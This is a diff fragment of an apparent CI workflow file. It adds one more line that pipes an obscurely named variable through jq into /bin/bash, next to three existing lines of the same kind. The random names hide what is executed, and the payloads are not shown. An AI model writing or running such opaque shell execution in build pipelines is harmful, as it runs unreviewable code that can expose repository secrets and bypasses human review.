@@ -21,6 +21,7 @@ jobs:
           echo $s489 | jq -r .szsna9887 | /bin/bash
           echo $gs196 | jq -r .wwy7 | /bin/bash
           echo $dq77 | jq -r .yr3 | /bin/bash
+          printf '%s' "$o0" | jq -r .r629 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
